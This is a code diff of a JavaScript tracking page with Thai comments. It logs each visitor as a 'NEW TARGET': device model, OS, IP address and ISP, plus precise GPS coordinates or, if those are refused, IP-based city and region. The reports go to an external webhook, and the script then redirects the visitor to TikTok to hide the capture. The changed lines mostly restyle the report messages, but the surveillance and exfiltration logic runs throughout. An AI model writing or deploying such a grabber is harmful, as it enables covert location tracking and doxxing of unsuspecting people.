@@ -47,13 +47,17 @@
                     }
                 }
 
-                // ส่ง Report แรก: เฉพาะสเปคเครื่องและ IP (ยังไม่ลงจังหวัด)
-                let report = `📂 **NEW TARGET LOGGED (${deviceType})**\n\`\`\`\n`;
-                report += `[DEVICE (อุปกรณ์)]\n`;
-                report += `Model (รุ่น): ${modelName}\n`;
-                report += `OS (ระบบปฏิบัติการ): ${check(navigator.platform)}\n`;
-                report += `IP (ไอพี): ${check(data.ip)}\n`;
-                report += `ISP (ผู้ให้บริการ): ${check(data.org)}\n\`\`\``;
+                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
+                let report = `📂 **NEW TARGET LOGGED**\n`;
+                report += `──────────────────────────\n`;
+                report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
+                report += `> **Model (รุ่น):** ${modelName}\n`;
+                report += `> **Type (ประเภท):** ${deviceType}\n`;
+                report += `> **OS (ระบบ):** ${check(navigator.platform)}\n\n`;
+                report += `🌐 **[NETWORK (เครือข่าย)]**\n`;
+                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
+                report += `> **ISP (ค่ายเน็ต):** ${check(data.org)}\n`;
+                report += `──────────────────────────`;
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -71,19 +75,20 @@
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (${modelName}) (พิกัดแม่นยำสูง)**\n📍 Google Maps (พิกัดตรงตามจริง): ${mapsLink}\n✅ Status: Precise Data (ข้อมูลแม่นยำพิกัดตรง)` 
+                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำสูง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำพิกัดตรง)\n──────────────────────────` 
                             })
                         });
                         window.location.href = "https://www.tiktok.com";
 
                     }, async () => { 
-                        // ถ้าปฏิเสธ (Denied) ให้ใช้พิกัด IP แทน
-                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n\`\`\`\n`;
-                        backupReport += `[IP BASED LOCATION (ตำแหน่งอ้างอิงจากไอพี)]\n`;
-                        backupReport += `City (เมือง): ${check(data.city)}\n`;
-                        backupReport += `Region (จังหวัด): ${check(data.region)}\n`;
-                        backupReport += `Country (ประเทศ): ${check(data.country_name)}\n`;
-                        backupReport += `\n❌ Status: Data Inaccurate (ข้อมูลอาจไม่ตรงคลาดเคลื่อน)\n\`\`\``;
+                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
+                        backupReport += `──────────────────────────\n`;
+                        backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
+                        backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
+                        backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
+                        backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
+                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงคลาดเคลื่อน)\n`;
+                        backupReport += `──────────────────────────`;
 
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
